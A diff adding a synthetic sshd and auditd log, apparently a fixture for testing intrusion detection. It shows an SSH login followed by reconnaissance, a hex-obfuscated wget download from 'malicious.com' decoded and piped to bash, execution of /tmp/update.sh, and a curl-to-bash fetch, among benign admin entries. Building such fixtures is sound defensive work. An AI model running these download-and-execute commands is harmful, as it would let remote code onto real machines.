@@ -1,0 +1,18 @@
+May 22 01:59:00 host sshd[12000]: Failed password for root from 203.0.113.9 port 51111 ssh2
+May 22 02:01:00 host sshd[12001]: Accepted password for admin from 203.0.113.9 port 46118 ssh2
+May 22 02:01:01 host sshd[12001]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+May 22 02:01:03 host audit[12345]: type=EXECVE msg=audit(...): a0="ls" a1="-la"
+May 22 02:01:04 host audit[12345]: type=EXECVE msg=audit(...): a0="pwd"
+May 22 02:01:05 host audit[12345]: type=EXECVE msg=audit(...): a0="id"
+May 22 02:01:06 host audit[12345]: type=EXECVE msg=audit(...): a0="whoami"
+May 22 02:01:07 host audit[12345]: type=EXECVE msg=audit(...): a0="exit"
+May 22 02:02:05 host audit[12349]: type=EXECVE msg=audit(...): a0="echo" a1="7767657420687474703a2f2f6d616c6963696f75732e636f6d2f7570646174652e7368202d4f202f746d702f7570646174652e73682026262063686d6f6420373535202f746d702f7570646174652e7368"
+May 22 02:02:05 host audit[12350]: type=EXECVE msg=audit(...): a0="sh" a1="-c" a2="echo '7767657420687474703a2f2f6d616c6963696f75732e636f6d2f7570646174652e7368202d4f202f746d702f7570646174652e73682026262063686d6f6420373535202f746d702f7570646174652e7368' | xxd -p -r | bash"
+May 22 02:02:06 host audit[12352]: type=EXECVE msg=audit(...): a0="chmod" a1="+x" a2="/tmp/update.sh"
+May 22 02:02:07 host audit[12353]: type=EXECVE msg=audit(...): a0="/tmp/update.sh"
+May 22 02:03:00 host audit[12360]: type=EXECVE msg=audit(...): a0="curl" a1="-s" a2="http://malicious.com/m.sh" a3="|" a4="bash"
+May 22 02:10:00 host audit[12400]: type=EXECVE msg=audit(...): a0="/usr/sbin/cron" a1="-f"
+May 22 02:10:01 host audit[12401]: type=EXECVE msg=audit(...): a0="/usr/bin/systemctl" a1="restart" a2="nginx"
+May 22 02:10:02 host audit[12402]: type=EXECVE msg=audit(...): a0="tar" a1="-czf" a2="/tmp/backup.tar.gz" a3="/var/log"
+May 22 02:10:03 host audit[12403]: type=EXECVE msg=audit(...): a0="/usr/bin/apt-get" a1="install" a2="-y" a3="nginx"
+May 22 02:10:04 host audit[12404]: type=SYSCALL msg=audit(...): arch=c000003e syscall=59 success=yes exit=0 a0=7f0e1c2b3a40 a1=7f0e1c2b3b10
